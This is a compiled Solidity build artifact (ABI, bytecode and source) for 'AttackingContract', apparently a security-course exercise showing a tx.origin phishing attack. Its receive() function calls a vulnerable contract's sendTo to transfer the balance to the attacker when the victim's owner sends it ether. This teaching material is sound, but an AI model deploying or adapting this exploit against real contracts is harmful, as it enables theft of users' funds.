{
  "contractName": "AttackingContract",
  "abi": [
    {
      "inputs": [],
      "name": "attacker",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "myContract",
      "outputs": [
        {
          "internalType": "contract MyContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "myContractAddress",
          "type": "address"
        }
      ],
      "name": "attackingContract",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610424806100206000396000f3fe6080604052600436106100385760003560e01c80633b5fdefc1461010a57806348eb76ee14610133578063bc33657a1461015e57610105565b366101055760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639e1a00aa600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16316040518363ffffffff1660e01b81526004016100d19291906102b1565b600060405180830381600087803b1580156100eb57600080fd5b505af11580156100ff573d6000803e3d6000fd5b50505050005b600080fd5b34801561011657600080fd5b50610131600480360381019061012c919061030b565b610189565b005b34801561013f57600080fd5b5061014861020d565b6040516101559190610359565b60405180910390f35b34801561016a57600080fd5b50610173610233565b60405161018091906103d3565b60405180910390f35b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061028282610257565b9050919050565b61029281610277565b82525050565b6000819050919050565b6102ab81610298565b82525050565b60006040820190506102c66000830185610289565b6102d360208301846102a2565b9392505050565b600080fd5b6102e881610277565b81146102f357600080fd5b50565b600081359050610305816102df565b92915050565b600060208284031215610321576103206102da565b5b600061032f848285016102f6565b91505092915050565b600061034382610257565b9050919050565b61035381610338565b82525050565b600060208201905061036e600083018461034a565b92915050565b6000819050919050565b600061039961039461038f84610257565b610374565b610257565b9050919050565b60006103ab8261037e565b9050919050565b60006103bd826103a0565b9050919050565b6103cd816103b2565b82525050565b60006020820190506103e860008301846103c4565b9291505056fea26469706673582212206462e0127009d647a0507d8832d1bd5c7e8da9f0f3148806b24c2fc8b8285dfe64736f6c634300080c0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.12;\r\n\r\nimport \"./05_TxOrigin.sol\";\r\n\r\ncontract AttackingContract {\r\n\r\n    MyContract public myContract;\r\n    address public attacker;\r\n\r\n    function attackingContract(address payable myContractAddress) public {\r\n        myContract = MyContract(myContractAddress);\r\n        attacker = msg.sender;\r\n    }\r\n\r\n    receive() external payable{\r\n        myContract.sendTo(payable(attacker), msg.sender.balance);\r\n    }\r\n\r\n}\r\n",
  "sourcePath": "C:\\Users\\yanni\\Documents\\Formation Alyra\\Solidity_security\\contracts\\06_Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.12+commit.f00d7308.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2022-02-27T18:02:34.348Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}